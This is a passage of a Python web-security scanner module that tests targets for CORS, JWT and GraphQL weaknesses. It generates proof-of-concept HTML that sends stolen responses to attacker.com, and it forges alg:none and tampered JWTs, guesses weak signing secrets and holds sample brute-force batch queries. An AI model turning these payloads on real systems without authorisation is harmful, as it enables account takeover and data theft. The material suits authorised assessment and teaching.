# backend/modules/business_logic_scanner.py
# Module 5 — CORS, JWT & GraphQL Business Logic Scanner
#
# Three sub-scanners:
#   A. CORS misconfiguration testing (5 attack vectors)
#   B. JWT vulnerability testing (5 attack vectors)
#   C. GraphQL introspection & schema analysis

import re
import json
import base64
import struct
import hmac
import hashlib
import requests
from urllib.parse import urlparse, urljoin

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (compatible; E-WMEAP-Scanner/1.0)",
})
REQUEST_TIMEOUT_SECONDS = 8


def _safe_json(response: requests.Response) -> dict:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}


def _decode_jwt_segment(segment: str) -> dict:
    padded = segment + "=" * (-len(segment) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(padded.encode()))
    except (ValueError, json.JSONDecodeError):
        return {}

SEV_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "None": 4}

# ══════════════════════════════════════════════════════════════════════════════
# A. CORS SCANNER
# ══════════════════════════════════════════════════════════════════════════════

# Endpoints commonly requiring auth — best targets for CORS testing
CORS_TEST_ENDPOINTS = [
    "/api/user",
    "/api/users",
    "/api/user/profile",
    "/api/profile",
    "/api/me",
    "/api/account",
    "/api/v1/user",
    "/api/v1/me",
    "/api/v1/profile",
    "/api/v2/user",
    "/graphql",
    "/api/admin",
    "/user/profile",
    "/profile",
    "/account",
    "/",           # root — always test
]

def _cors_test_endpoint(url: str, origin: str) -> dict:
    """Send a preflight + actual request with a given Origin header."""
    try:
        # OPTIONS preflight
        preflight = SESSION.options(
            url,
            headers={
                "Origin": origin,
                "Access-Control-Request-Method":  "GET",
                "Access-Control-Request-Headers": "Authorization, Content-Type",
            },
            timeout=8,
            allow_redirects=False,
        )
        preflight_acao  = preflight.headers.get("Access-Control-Allow-Origin",      "")
        preflight_acac  = preflight.headers.get("Access-Control-Allow-Credentials", "")
        preflight_acam  = preflight.headers.get("Access-Control-Allow-Methods",     "")
        preflight_acah  = preflight.headers.get("Access-Control-Allow-Headers",     "")

        # Actual GET with origin
        actual = SESSION.get(
            url,
            headers={"Origin": origin},
            timeout=8,
            allow_redirects=False,
        )
        actual_acao = actual.headers.get("Access-Control-Allow-Origin",      "")
        actual_acac = actual.headers.get("Access-Control-Allow-Credentials", "")

        return {
            "preflight_status":    preflight.status_code,
            "actual_status":       actual.status_code,
            "acao":                actual_acao or preflight_acao,
            "acac":                actual_acac or preflight_acac,
            "acam":                preflight_acam,
            "acah":                preflight_acah,
        }
    except Exception as e:
        return {"error": str(e)}


def _find_cors_endpoints(base_url: str) -> list:
    """Find endpoints that actually exist and respond."""
    found = []
    for path in CORS_TEST_ENDPOINTS:
        url = base_url.rstrip("/") + path
        try:
            r = SESSION.get(url, timeout=5, allow_redirects=False)
            if r.status_code not in (404, 410):
                # Check if CORS headers present at all
                if r.headers.get("Access-Control-Allow-Origin"):
                    found.append(url)
                elif r.status_code in (200, 401, 403):
                    # No CORS headers but endpoint exists — still worth testing
                    found.append(url)
        except Exception:
            continue
        if len(found) >= 3:
            break
    # Always include root
    root = base_url.rstrip("/") + "/"
    if root not in found:
        found.insert(0, root)
    return found[:4]


def scan_cors(base_url: str) -> dict:
    """
    Run all 5 CORS attack vectors against discovered endpoints.
    Returns findings with exploitability analysis and PoC HTML.
    """
    parsed   = urlparse(base_url)
    hostname = parsed.netloc
    scheme   = parsed.scheme

    # Build test origins
    test_origins = {
        "wildcard_probe":   "https://evil-ewmeap.com",
        "reflection":       "https://attacker-ewmeap.com",
        "null":             "null",
        "subdomain":        f"{scheme}://evil.{hostname}",
        "trusted_subdomain":f"{scheme}://sub.{hostname}",
    }

    endpoints   = _find_cors_endpoints(base_url)
    findings    = []
    tested_urls = []

    for endpoint_url in endpoints:
        endpoint_results = {}

        for test_name, origin in test_origins.items():
            result = _cors_test_endpoint(endpoint_url, origin)
            if "error" in result:
                continue
            endpoint_results[test_name] = {**result, "sent_origin": origin}

        if not endpoint_results:
            continue

        tested_urls.append(endpoint_url)

        # ── Analyse each test result ──────────────────────────────────────
        for test_name, res in endpoint_results.items():
            acao = res.get("acao", "")
            acac = res.get("acac", "").lower()
            sent = res.get("sent_origin", "")

            finding = None

            # Test 1 — Wildcard ACAO
            if test_name == "wildcard_probe" and acao == "*":
                finding = {
                    "test":        "Wildcard Origin",
                    "severity":    "High",
                    "endpoint":    endpoint_url,
                    "sent_origin": sent,
                    "received":    f"Access-Control-Allow-Origin: {acao}",
                    "exploitable": True,
                    "description": "Server allows any origin (*). Any website can make cross-origin requests.",
                    "impact":      "Any malicious website can read responses from this API.",
                    "poc":         _generate_cors_poc(endpoint_url, sent, "wildcard"),
                    "technique":   _exploit_technique("cors_wildcard", endpoint_url),
                }

            # Test 2 — Origin reflection
            elif test_name == "reflection" and acao == sent:
                sev = "Critical" if acac == "true" else "High"
                finding = {
                    "test":        "Origin Reflection",
                    "severity":    sev,
                    "endpoint":    endpoint_url,
                    "sent_origin": sent,
                    "received":    f"Access-Control-Allow-Origin: {acao}",
                    "credentials": acac == "true",
                    "exploitable": True,
                    "description": "Server reflects back the exact Origin header sent. Any origin is effectively trusted.",
                    "impact":      (
                        "CRITICAL: With Allow-Credentials: true, attacker can steal authenticated session data."
                        if acac == "true" else
                        "Attacker can read response data from any origin."
                    ),
                    "poc":         _generate_cors_poc(endpoint_url, sent, "reflection", credentials=(acac == "true")),
                    "technique":   _exploit_technique("cors_reflection", endpoint_url),
                }

            # Test 3 — Null origin
            elif test_name == "null" and acao.lower() in ("null", "*"):
                finding = {
                    "test":        "Null Origin Allowed",
                    "severity":    "High",
                    "endpoint":    endpoint_url,
                    "sent_origin": "null",
                    "received":    f"Access-Control-Allow-Origin: {acao}",
                    "exploitable": True,
                    "description": "Server allows 'null' origin. Can be exploited via sandboxed iframes.",
                    "impact":      "Attacker can craft a sandboxed iframe that sends requests with null origin to steal data.",
                    "poc":         _generate_cors_poc(endpoint_url, "null", "null_origin"),
                    "technique":   _exploit_technique("cors_null", endpoint_url),
                }

            # Test 4 — Credentials + reflection
            elif test_name == "reflection" and acac == "true" and acao == sent:
                finding = {
                    "test":        "Credentials + Origin Reflection",
                    "severity":    "Critical",
                    "endpoint":    endpoint_url,
                    "sent_origin": sent,
                    "received":    f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: true",
                    "exploitable": True,
                    "description": "Both Allow-Origin reflection AND Allow-Credentials: true. Most dangerous CORS config.",
                    "impact":      "Attacker can steal authenticated user data including session cookies and tokens.",
                    "poc":         _generate_cors_poc(endpoint_url, sent, "reflection", credentials=True),
                    "technique":   _exploit_technique("cors_cred_reflection", endpoint_url),
                }

            # Test 5 — Subdomain trust
            elif test_name in ("subdomain", "trusted_subdomain") and acao == sent:
                finding = {
                    "test":        "Subdomain Trust",
                    "severity":    "High",
                    "endpoint":    endpoint_url,
                    "sent_origin": sent,
                    "received":    f"Access-Control-Allow-Origin: {acao}",
                    "exploitable": True,
                    "description": f"Server trusts subdomain origins ({sent}). If any subdomain is XSS-vulnerable, attacker can pivot.",
                    "impact":      "XSS on any subdomain → full authenticated CORS attack on main domain.",
                    "poc":         _generate_cors_poc(endpoint_url, sent, "subdomain"),
                    "technique":   _exploit_technique("cors_subdomain", endpoint_url),
                }

            if finding:
                # Avoid duplicates for same endpoint+test
                key = f"{finding['test']}_{endpoint_url}"
                if not any(f.get("_key") == key for f in findings):
                    finding["_key"] = key
                    findings.append(finding)

    # If no CORS headers at all anywhere
    no_cors = len(tested_urls) > 0 and len(findings) == 0
    overall = "None"
    if findings:
        overall = min(findings, key=lambda f: SEV_ORDER.get(f["severity"], 99))["severity"]

    # Clean internal keys
    for f in findings:
        f.pop("_key", None)

    return {
        "endpoints_tested": tested_urls,
        "total_tested":     len(tested_urls),
        "findings":         findings,
        "overall_severity": overall,
        "no_cors_headers":  no_cors,
        "summary":          _cors_summary(findings, no_cors),
    }


def _generate_cors_poc(target_url: str, origin: str, attack_type: str, credentials: bool = False) -> str:
    cred_str = "\n    credentials: 'include'," if credentials else ""
    if attack_type == "null_origin":
        return f"""<!-- NULL ORIGIN CORS PoC — use inside sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="
<script>
fetch('{target_url}', {{
    credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
    parent.postMessage(data, '*');
    // Or send to attacker server:
    new Image().src = 'https://attacker.com/steal?d=' + encodeURIComponent(data.substring(0,500));
}});
</script>
"></iframe>"""

    return f"""<!-- CORS EXPLOIT PoC — host on attacker.com, victim must be logged into {target_url} -->
<script>
fetch('{target_url}', {{
    method: 'GET',{cred_str}
    headers: {{
        'Origin': '{origin}'
    }}
}})
.then(r => r.json())
.then(data => {{
    // Send stolen data to attacker server
    fetch('https://attacker.com/steal?d=' + encodeURIComponent(JSON.stringify(data)));
    console.log('[EWMEAP] Stolen data:', data);
}})
.catch(err => {{
    // Try text if JSON fails
    fetch('{target_url}', {{ credentials: 'include' }})
    .then(r => r.text())
    .then(text => new Image().src = 'https://attacker.com/steal?d=' + encodeURIComponent(text.substring(0,500)));
}});
</script>"""


def _exploit_technique(attack_type: str, target: str) -> dict:
    techniques = {
        "cors_wildcard": {
            "name":   "Wildcard CORS Data Theft",
            "steps":  [
                "Host the PoC HTML on any domain (attacker.com)",
                "Trick a logged-in victim into visiting attacker.com",
                "Browser automatically sends request to target with victim credentials",
                "Target responds with Access-Control-Allow-Origin: * — browser allows read",
                "Response data sent to attacker collection server",
            ],
            "limitation": "Wildcard (*) cannot be combined with Allow-Credentials — so cookies won't be sent. Works for public data only.",
        },
        "cors_reflection": {
            "name":   "Reflected Origin Session Hijack",
            "steps":  [
                "Host PoC HTML on attacker.com",
                "Victim visits attacker.com while logged into target",
                "Request sent with Origin: attacker.com",
                "Server reflects: Access-Control-Allow-Origin: attacker.com",
                "If Allow-Credentials: true — cookies included, authenticated data stolen",
            ],
            "limitation": "None — most dangerous CORS misconfiguration.",
        },
        "cors_null": {
            "name":   "Null Origin Sandboxed iframe Attack",
            "steps":  [
                "Host page containing sandboxed iframe on any origin",
                "Sandboxed iframe sends Origin: null automatically",
                "Server allows null origin",
                "iframe reads response and sends to parent via postMessage",
                "Parent page exfiltrates data",
            ],
            "limitation": "Requires victim to visit attacker page.",
        },
        "cors_cred_reflection": {
            "name":   "Authenticated CORS Data Exfiltration",
            "steps":  [
                "Host PoC on attacker.com",
                "Victim visits while logged in — cookies sent automatically",
                "Server reflects origin AND allows credentials",
                "Full authenticated API response readable by attacker",
                "Account details, tokens, PII all exposed",
            ],
            "limitation": "None — this is the maximum severity CORS vulnerability.",
        },
        "cors_subdomain": {
            "name":   "Subdomain XSS → CORS Pivot",
            "steps":  [
                "Find XSS vulnerability on any subdomain (e.g. blog.target.com)",
                "Inject CORS fetch payload via XSS",
                "XSS runs from trusted subdomain origin",
                "Main API trusts the subdomain — allows the request",
                "Authenticated data from main API exfiltrated via subdomain XSS",
            ],
            "limitation": "Requires finding XSS on a trusted subdomain first.",
        },
    }
    return techniques.get(attack_type, {})


def _cors_summary(findings: list, no_cors: bool) -> str:
    if not findings:
        return "No exploitable CORS misconfigurations detected." if not no_cors else "No CORS headers present on tested endpoints."
    critical = [f for f in findings if f["severity"] == "Critical"]
    high     = [f for f in findings if f["severity"] == "High"]
    parts    = []
    if critical:
        parts.append(f"{len(critical)} critical CORS misconfiguration(s) — authenticated data theft possible")
    if high:
        parts.append(f"{len(high)} high-severity CORS issue(s) found")
    return ". ".join(parts) + "."


# ══════════════════════════════════════════════════════════════════════════════
# B. JWT SCANNER
# ══════════════════════════════════════════════════════════════════════════════

COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "test", "key",
    "supersecret", "mysecret", "jwtSecret", "jwt_secret",
    "secret123", "password123", "changeme", "qwerty",
    "your-256-bit-secret", "your-secret-key", "development",
    "production", "staging", "app_secret", "flask_secret",
    "django-insecure", "laravel_secret", "rails_secret",
    "", "null", "undefined",
]

JWT_TEST_ENDPOINTS = [
    "/api/user", "/api/me", "/api/profile",
    "/api/v1/user", "/api/v1/me",
    "/api/admin", "/api/dashboard",
    "/user", "/profile", "/account",
]


def _extract_jwt_from_response(base_url: str) -> str | None:
    """Try to find a JWT in common response headers/cookies."""
    for path in JWT_TEST_ENDPOINTS[:5]:
        try:
            r = SESSION.get(base_url.rstrip("/") + path, timeout=REQUEST_TIMEOUT_SECONDS)
            # Check Authorization header echo or Set-Cookie
            auth = r.headers.get("Authorization", "")
            if auth.startswith("Bearer "):
                token = auth[7:]
                if _is_valid_jwt_format(token):
                    return token
            # Check cookies
            for _, v in r.cookies.items():
                if _is_valid_jwt_format(v):
                    return v
            # Check JSON body
            data = _safe_json(r)
            for key in ("token", "access_token", "jwt", "accessToken", "id_token"):
                val = data.get(key, "")
                if val and _is_valid_jwt_format(str(val)):
                    return str(val)
        except requests.RequestException:
            continue
    return None


def _is_valid_jwt_format(token: str) -> bool:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return False
    try:
        base64.urlsafe_b64decode((parts[0] + "=" * (-len(parts[0]) % 4)).encode())
        base64.urlsafe_b64decode((parts[1] + "=" * (-len(parts[1]) % 4)).encode())
        return True
    except ValueError:
        return False


def _decode_jwt_header(token: str) -> dict:
    return _decode_jwt_segment(token.split(".")[0])


def _decode_jwt_payload(token: str) -> dict:
    return _decode_jwt_segment(token.split(".")[1])


def _build_alg_none_token(original_token: str) -> str:
    """Craft a JWT with alg:none and no signature."""
    payload = _decode_jwt_payload(original_token)
    header  = {"alg": "none", "typ": "JWT"}

    def b64url(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    return f"{b64url(header)}.{b64url(payload)}."


def _build_expired_modified_token(original_token: str) -> str:
    """Craft a JWT with exp set far in the future."""
    import time
    payload = _decode_jwt_payload(original_token)
    payload["exp"] = int(time.time()) + 99999999
    header  = _decode_jwt_header(original_token)

    def b64url(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    # Keep original signature — server should reject if it validates
    original_sig = original_token.split(".")[2]
    return f"{b64url(header)}.{b64url(payload)}.{original_sig}"


def _try_hmac_secret(token: str, secret: str) -> bool:
    """Check if token was signed with this HMAC secret."""
    try:
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        secret_bytes  = secret.encode()
        expected_sig  = base64.urlsafe_b64encode(
            hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        return parts[2] == expected_sig
    except Exception:
        return False


def _test_jwt_on_endpoint(base_url: str, token: str, endpoint_path: str) -> tuple[int, bool]:
    """Send a JWT to an endpoint, return (status_code, response_has_data)."""
    url = base_url.rstrip("/") + endpoint_path
    try:
        r = SESSION.get(
            url,
            headers={"Authorization": f"Bearer {token}"},
            timeout=6,
        )
        has_data = r.status_code == 200 and len(r.content) > 10
        return r.status_code, has_data
    except Exception:
        return 0, False


def scan_jwt(base_url: str, provided_token: str = None) -> dict:
    """
    Test JWT vulnerabilities against the target.
    Uses a provided token if given, otherwise tries to discover one.
    """
    token = provided_token or _extract_jwt_from_response(base_url)
    findings = []

    if not token:
        return {
            "token_found":   False,
            "findings":      [],
            "overall_severity": "None",
            "summary":       "No JWT token found in API responses. Provide a token manually for deeper testing.",
            "header":        None,
            "payload":       None,
        }

    if not _is_valid_jwt_format(token):
        return {
            "token_found": False,
            "findings":    [],
            "overall_severity": "None",
            "summary":     "Provided value is not a valid JWT format.",
        }

    header  = _decode_jwt_header(token)
    payload = _decode_jwt_payload(token)
    alg     = header.get("alg", "unknown").upper()

    # Find a protected endpoint to test against
    test_endpoint = None
    for path in JWT_TEST_ENDPOINTS:
        url = base_url.rstrip("/") + path
        try:
            r = SESSION.get(url, timeout=5)
            if r.status_code in (401, 403, 200):
                test_endpoint = path
                break
        except Exception:
            continue

    if not test_endpoint:
        test_endpoint = JWT_TEST_ENDPOINTS[0]

    # ── Test 1: Algorithm none ────────────────────────────────────────────
    alg_none_token = _build_alg_none_token(token)
    status, has_data = _test_jwt_on_endpoint(base_url, alg_none_token, test_endpoint)
    if has_data or status == 200:
        findings.append({
            "test":          "Algorithm Confusion (alg: none)",
            "severity":      "Critical",
            "exploitable":   True,
            "description":   "Server accepts JWT with alg:none — signature is not verified at all.",
            "impact":        "Attacker can forge any JWT payload (change user ID, role, admin flag) without knowing the secret.",
            "crafted_token": alg_none_token[:80] + "...",
            "response_code": status,
            "technique":     {
                "name":  "JWT alg:none Privilege Escalation",
                "steps": [
                    "Take any valid JWT token (even expired)",
                    "Change header to: {\"alg\":\"none\",\"typ\":\"JWT\"}",
                    "Modify payload: change user_id, role to admin, is_admin to true",
                    "Remove the signature (leave trailing dot)",
                    "Send to API — server accepts without verifying signature",
                    "You now have admin access",
                ],
            },
        })

    # ── Test 2: Weak HMAC secret ──────────────────────────────────────────
    if alg in ("HS256", "HS384", "HS512"):
        cracked_secret = None
        for secret in COMMON_JWT_SECRETS:
            if _try_hmac_secret(token, secret):
                cracked_secret = secret
                break

        if cracked_secret is not None:
            findings.append({
                "test":           "Weak HMAC Secret",
                "severity":       "Critical",
                "exploitable":    True,
                "cracked_secret": repr(cracked_secret),
                "description":    f"JWT signing secret cracked: {repr(cracked_secret)}",
                "impact":         "Attacker can sign any JWT payload with the known secret — complete account takeover.",
                "technique": {
                    "name":  "JWT Secret Cracking → Token Forgery",
                    "steps": [
                        f"Secret found: {repr(cracked_secret)}",
                        "Use this secret to sign arbitrary JWT payloads",
                        "Modify payload: set admin:true, change user_id to target user",
                        "Sign with known secret using HS256",
                        "API accepts forged token as legitimate",
                    ],
                },
            })

    # ── Test 3: Expired token accepted ───────────────────────────────────
    import time
    exp = payload.get("exp", 0)
    if exp and exp < time.time():
        # Token is actually expired — test if server still accepts original
        status, has_data = _test_jwt_on_endpoint(base_url, token, test_endpoint)
        if has_data or status == 200:
            findings.append({
                "test":        "Expired Token Accepted",
                "severity":    "High",
                "exploitable": True,
                "description": "Server accepts expired JWT tokens — expiration is not validated.",
                "impact":      "Stolen or leaked tokens remain valid indefinitely.",
                "technique": {
                    "name":  "Expired Token Replay",
                    "steps": [
                        "Obtain any JWT token (from logs, old sessions, traffic capture)",
                        "Use it even after expiration — server does not check exp claim",
                        "Leaked tokens from data breaches remain permanently valid",
                    ],
                },
            })

    # ── Test 4: Modified exp accepted ────────────────────────────────────
    future_token = _build_expired_modified_token(token)
    status, has_data = _test_jwt_on_endpoint(base_url, future_token, test_endpoint)
    if has_data or status == 200:
        findings.append({
            "test":          "Payload Tampering Accepted",
            "severity":      "High",
            "exploitable":   True,
            "description":   "Server accepts tokens with modified payload but original signature.",
            "impact":        "JWT signature verification may be disabled or incorrectly implemented.",
            "crafted_token": future_token[:80] + "...",
            "technique": {
                "name":  "JWT Payload Tampering",
                "steps": [
                    "Decode JWT payload",
                    "Modify any claim (exp, user_id, role, is_admin)",
                    "Re-encode with original signature",
                    "Server accepts modified token without re-verifying signature",
                ],
            },
        })

    # ── Test 5: Invalid token accepted ───────────────────────────────────
    garbage_token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZXZpbCJ9.INVALIDSIGNATURE"
    status, has_data = _test_jwt_on_endpoint(base_url, garbage_token, test_endpoint)
    if has_data or status == 200:
        findings.append({
            "test":        "Invalid JWT Accepted",
            "severity":    "Critical",
            "exploitable": True,
            "description": "Server accepts completely invalid JWT signatures.",
            "impact":      "JWT validation is entirely disabled — any token works.",
            "technique": {
                "name":  "No JWT Validation",
                "steps": [
                    "Craft any JWT with desired payload",
                    "Use any random string as signature",
                    "Server accepts without any verification",
                    "Complete authentication bypass",
                ],
            },
        })

    # ── Informational: analyse token claims ──────────────────────────────
    info_findings = _analyse_jwt_claims(header, payload, alg)
    findings.extend(info_findings)

    findings.sort(key=lambda f: SEV_ORDER.get(f["severity"], 99))
    overall = findings[0]["severity"] if findings else "None"

    return {
        "token_found":      True,
        "token_preview":    token[:40] + "...",
        "header":           header,
        "payload":          _sanitise_payload(payload),
        "algorithm":        alg,
        "findings":         findings,
        "overall_severity": overall,
        "summary":          _jwt_summary(findings, alg),
    }


def _analyse_jwt_claims(header: dict, payload: dict, alg: str) -> list:
    """Non-exploitable but informational JWT observations."""
    findings = []
    import time

    if alg in ("RS256", "RS384", "RS512"):
        findings.append({
            "test":        "RS256 Algorithm Detected",
            "severity":    "Medium",
            "exploitable": False,
            "description": "Token uses RS256 (asymmetric). Algorithm confusion attack (RS256→HS256) may be possible if public key is accessible.",
            "impact":      "If public key is obtainable, attacker can sign HS256 tokens with it.",
            "technique": {
                "name":  "RS256 → HS256 Algorithm Confusion",
                "steps": [
                    "Fetch public key from /.well-known/jwks.json or /api/auth/keys",
                    "Change JWT header alg from RS256 to HS256",
                    "Sign the token using the PUBLIC KEY as HMAC secret",
                    "Server using HS256 will verify against public key — accepts forged token",
                ],
            },
        })

    if not payload.get("exp"):
        findings.append({
            "test":        "No Expiration Claim",
            "severity":    "Medium",
            "exploitable": False,
            "description": "JWT has no exp claim — token never expires by design.",
            "impact":      "Leaked tokens are permanently valid.",
            "technique":   {},
        })

    sensitive_claims = ["password", "secret", "ssn", "credit_card", "cvv", "private_key"]
    found_sensitive = [k for k in payload if any(s in k.lower() for s in sensitive_claims)]
    if found_sensitive:
        findings.append({
            "test":        "Sensitive Data in JWT Payload",
            "severity":    "High",
            "exploitable": False,
            "description": f"JWT payload contains sensitive-sounding claims: {found_sensitive}. JWT payloads are base64 encoded, not encrypted.",
            "impact":      "Anyone who intercepts the token can read these values by base64-decoding the payload.",
            "technique":   {},
        })

    return findings


def _sanitise_payload(payload: dict) -> dict:
    """Mask sensitive values in payload for display."""
    safe = {}
    for k, v in payload.items():
        if any(s in k.lower() for s in ("password", "secret", "token", "key")):
            safe[k] = str(v)[:4] + "***"
        else:
            safe[k] = v
    return safe


def _jwt_summary(findings: list, alg: str) -> str:
    exploitable = [f for f in findings if f.get("exploitable")]
    if not exploitable:
        return f"JWT using {alg} — no exploitable vulnerabilities detected in automated tests."
    return f"{len(exploitable)} exploitable JWT vulnerability/ies found. Algorithm: {alg}."


# ══════════════════════════════════════════════════════════════════════════════
# C. GRAPHQL SCANNER
# ══════════════════════════════════════════════════════════════════════════════

GRAPHQL_ENDPOINTS = [
    "/graphql",
    "/api/graphql",
    "/graphiql",
    "/gql",
    "/api/gql",
    "/query",
    "/v1/graphql",
    "/v2/graphql",
]

SENSITIVE_TYPE_KEYWORDS = [
    "user", "admin", "password", "token", "secret", "key",
    "auth", "credential", "ssn", "credit", "card", "payment",
    "private", "internal", "role", "permission", "session",
]

SENSITIVE_FIELD_KEYWORDS = [
    "password", "passwd", "secret", "token", "apiKey", "api_key",
    "privateKey", "private_key", "ssn", "creditCard", "credit_card",
    "cvv", "pin", "salt", "hash", "resetToken", "authToken",
    "accessToken", "refreshToken", "sessionId", "twoFactorSecret",
]

INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind }
      }
    }
  }
}
"""

BATCH_QUERY = """[
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"}
]"""


def _find_graphql_endpoint(base_url: str) -> str | None:
    """Discover GraphQL endpoint."""
    for path in GRAPHQL_ENDPOINTS:
        url = base_url.rstrip("/") + path
        try:
            # Send a simple introspection probe
            r = SESSION.post(
                url,
                json={"query": "{ __typename }"},
                timeout=7,
            )
            if r.status_code in (200, 400) and (
                "data" in r.text or "errors" in r.text or "graphql" in r.text.lower()
            ):
                return url
        except Exception:
            continue
    return None


def scan_graphql(base_url: str) -> dict:
    """Test GraphQL for introspection, batching, field suggestions, and sensitive data."""
    endpoint = _find_graphql_endpoint(base_url)

    if not endpoint:
        return {
            "endpoint_found": False,
            "findings":       [],
            "overall_severity": "None",
            "summary":        "No GraphQL endpoint found on common paths.",
        }

    findings = []

    # ── Test 1: Introspection enabled ────────────────────────────────────
    try:
        r = SESSION.post(endpoint, json={"query": INTROSPECTION_QUERY}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            schema = data.get("data", {}).get("__schema", {})
            if schema:
                types   = schema.get("types", [])
                queries = schema.get("queryType", {})

                all_type_names = [
                    t["name"] for t in types
                    if t.get("name") and not t["name"].startswith("__")
                ]

                sensitive_types = [
                    t for t in all_type_names
                    if any(kw in t.lower() for kw in SENSITIVE_TYPE_KEYWORDS)
                ]

                # Find sensitive fields
                sensitive_fields = []
                for t in types:
                    if t.get("name", "").startswith("__"):
                        continue
                    for field in (t.get("fields") or []):
                        fname = field.get("name", "")
                        if any(kw in fname.lower() for kw in SENSITIVE_FIELD_KEYWORDS):
                            sensitive_fields.append({
                                "type":  t["name"],
                                "field": fname,
                            })

                findings.append({
                    "test":             "GraphQL Introspection Enabled",
                    "severity":         "High",
                    "exploitable":      True,
                    "endpoint":         endpoint,
                    "description":      "GraphQL introspection is enabled — full schema exposed to any unauthenticated caller.",
                    "impact":           "Attacker can enumerate all queries, mutations, types, and fields. Roadmap for further attacks.",
                    "total_types":      len(all_type_names),
                    "all_types":        all_type_names[:30],
                    "sensitive_types":  sensitive_types,
                    "sensitive_fields": sensitive_fields[:15],
                    "technique": {
                        "name":  "GraphQL Schema Enumeration",
                        "steps": [
                            f"Endpoint: {endpoint}",
                            "Send introspection query to get full schema",
                            "Map all available queries and mutations",
                            "Identify sensitive types/fields (User.password, Token.secret, etc.)",
                            "Use schema knowledge to craft targeted data-extraction queries",
                            "Try: { user(id: 1) { email password role } }",
                        ],
                        "sample_exploit": "{ user(id: 1) { id email role password authToken } }",
                    },
                })

    except Exception:
        pass

    # ── Test 2: Query batching ────────────────────────────────────────────
    try:
        r = SESSION.post(
            endpoint,
            data=BATCH_QUERY,
            headers={"Content-Type": "application/json"},
            timeout=8,
        )
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list) and len(data) > 1:
                findings.append({
                    "test":        "Query Batching Enabled",
                    "severity":    "Medium",
                    "exploitable": True,
                    "endpoint":    endpoint,
                    "description": "GraphQL allows batched queries — multiple operations in one request.",
                    "impact":      "Enables brute-force attacks bypassing per-request rate limits (e.g. password brute-force in a single HTTP request).",
                    "technique": {
                        "name":  "Batched Brute Force",
                        "steps": [
                            "Pack 100+ login mutation attempts in a single batch request",
                            "Each attempt runs as a separate operation",
                            "Rate limiter sees only 1 HTTP request, not 100 attempts",
                            "Effectively bypasses request-based rate limiting",
                        ],
                        "sample_exploit": '[{"query":"mutation{login(email:\\"a@b.com\\",password:\\"pass1\\"){token}}"},{"query":"mutation{login(email:\\"a@b.com\\",password:\\"pass2\\"){token}}"}]',
                    },
                })
    except Exception:
        pass

    # ── Test 3: Field suggestions / verbose errors ────────────────────────
    try:
        r = SESSION.post(
            endpoint,
            json={"query": "{ usr { emal } }"},
            timeout=7,
        )
        if r.status_code in (200, 400):
            body = r.text.lower()
            if "did you mean" in body or "suggestion" in body:
                findings.append({
                    "test":        "Field Suggestions Enabled",
                    "severity":    "Low",
                    "exploitable": False,
                    "endpoint":    endpoint,
                    "description": "GraphQL returns field name suggestions on typos — leaks schema structure even without introspection.",
                    "impact":      "Attacker can enumerate field names by probing with typos, even if introspection is disabled.",
                    "technique": {
                        "name":  "Field Enumeration via Suggestions",
                        "steps": [
                            "Send query with intentional typos: { usr { emal } }",
                            "Server responds: 'Did you mean user? Did you mean email?'",
                            "Enumerate all types and fields without introspection access",
                        ],
                    },
                })
    except Exception:
        pass

    # ── Test 4: Unauthenticated data access ───────────────────────────────
    if findings:  # Only if we got something back from GraphQL
        try:
            probe_queries = [
                "{ users { id email } }",
                "{ user(id: 1) { id email role } }",
                "{ me { id email } }",
                "{ admin { id email } }",
            ]
            for q in probe_queries:
                r = SESSION.post(endpoint, json={"query": q}, timeout=7)
                if r.status_code == 200:
                    data = r.json()
                    if "data" in data and data["data"] and not data.get("errors"):
                        findings.append({
                            "test":           "Unauthenticated Data Access",
                            "severity":       "Critical",
                            "exploitable":    True,
                            "endpoint":       endpoint,
                            "query_used":     q,
                            "description":    f"Query '{q}' returned data without authentication.",
                            "impact":         "Sensitive user data accessible without any credentials.",
                            "response_preview": str(data.get("data", ""))[:200],
                            "technique": {
                                "name":  "Unauthenticated GraphQL Data Dump",
                                "steps": [
                                    f"Send query: {q}",
                                    "No authentication required",
                                    "Full user/data list returned",
                                    "Enumerate IDs to extract all records",
                                ],
                            },
                        })
                        break
        except Exception:
            pass

    findings.sort(key=lambda f: SEV_ORDER.get(f["severity"], 99))
    overall = findings[0]["severity"] if findings else "None"

    return {
        "endpoint_found":   True,
        "endpoint":         endpoint,
        "findings":         findings,
        "overall_severity": overall,
        "summary":          _graphql_summary(findings),
    }


def _graphql_summary(findings: list) -> str:
    if not findings:
        return "GraphQL endpoint found but no critical misconfigurations detected."
    critical = [f for f in findings if f["severity"] == "Critical"]
    high     = [f for f in findings if f["severity"] == "High"]
    parts    = []
    if critical:
        parts.append(f"{len(critical)} critical GraphQL vulnerability/ies found")
    if high:
        parts.append(f"{len(high)} high-severity issue(s)")
    return ". ".join(parts) + "."


# ══════════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def scan_business_logic(url: str, jwt_token: str = None) -> dict:
    parsed   = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    cors_result    = scan_cors(base_url)
    jwt_result     = scan_jwt(base_url, provided_token=jwt_token)
    graphql_result = scan_graphql(base_url)

    all_severities = []
